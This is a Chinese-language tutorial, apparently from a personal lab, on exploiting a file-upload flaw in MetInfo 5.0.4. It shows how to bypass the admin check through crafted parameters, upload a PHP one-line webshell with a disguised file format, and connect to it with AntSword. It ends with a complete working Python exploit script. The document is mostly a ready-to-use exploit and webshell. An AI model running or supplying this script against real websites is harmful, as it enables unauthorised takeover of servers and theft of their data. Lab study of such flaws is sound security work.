# metinfo_5.0.4_file-upload漏洞利用脚本实战

- 场景：metinfo_5.0.4
- 靶机IP：192.168.200.148

#### 场景布置

- 实现该功能需要用`requests`模块，和注入点url与漏洞点vul，并创建一个请求

![](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312163522986.png)



### 构造请求参数

- 该漏洞需要传递的参数有`metinfo_admin_id`、`metinfo_admin_pass`、`met_admin_table`、`type`和`met_file_format`，把这些参数写到请求中去

  

![image-20240312164337231](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312164337231.png)

### 构造上传文件

- 由于需要利用文件上传漏洞上传木马，所以再请求的`files`中构造一句话木马文件和提交的传参

  ![image-20240312165447299](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312165447299.png)

### 发送请求

- 构造完成后发送该请求，并查看返回路径

  ![image-20240312165535184](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312165535184.png)

- 截取返回路径与url组成完整路径并显示连接密码返回给用户

  ![image-20240312170127786](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312170127786.png)

### 脚本测试

- 直接使用该脚本

  ![image-20240312170723778](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312170723778.png)

- 进入该网址并启动antsword连接

![image-20240312170753160](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312170753160.png)

![image-20240312170947338](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312170947338.png)



### 拿到shell

![image-20240312171041172](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240312171041172.png)



### 源码

```python
import requests

url = "http://192.168.200.148/MetInfo5.0.4/"
vul = "admin/include/uploadify.php"

req=requests.session()
#构造请求参数
params = {
    "metinfo_admin_id":    "hecker",
    "metinfo_admin_pass":  "zz",
    "met_admin_table":     "met_admin_table#",
    "type":                "upfile",
    "met_file_format":     "jpg|pphphp"
}

# 构造上传文件
files = {
    "Filedata" : (
        'zz.php',
        b"<?php @eval($_REQUEST[777]);?>",
        "image/png"
    )
}
data = {
    "submit" : "submit"
}

# 发送请求
res=req.post(url=url+vul,params=params,files=files,data=data)

#截取返回路径拼接完整路径并与连接密码一同返回
shell_path=url+res.text[5:]
print(f"[+] Shell path: {shell_path}     Pass:777")
```

